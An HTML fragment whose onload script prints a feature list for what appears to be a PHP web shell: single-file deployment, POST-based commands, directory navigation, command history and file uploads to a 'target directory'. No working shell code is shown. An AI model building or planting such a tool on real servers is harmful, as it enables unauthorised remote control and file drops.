...
<html>
    ...
    <body onload="readMeOnload()">
        ...
        <script type="text/javascript">
			...
			function readMeOnload()	{
				outputElement.innerHTML = '<h2>Features</h2>' + '<ul><li>Requires only a single PHP file</li><li>POST-based requests</li>'
				+ '<li>Support for current working directory</li><li>Command history with arrow keys</li><li>Upload files directly to target directory</li></ul>'
				+ '<h2>Custom Commands</h2>' + '<ul><li><code>cd</code> Return to default shell directory</li><li><code>cd &lt;path&gt;</code> Change directory</li>'
				+ '<li><code>cd -</code> Return to previous directory</li><li><code>clear</code> Clears all output</li><li><code>upload</code> Opens the file browser and uploads selected file</li></ul>';
			}
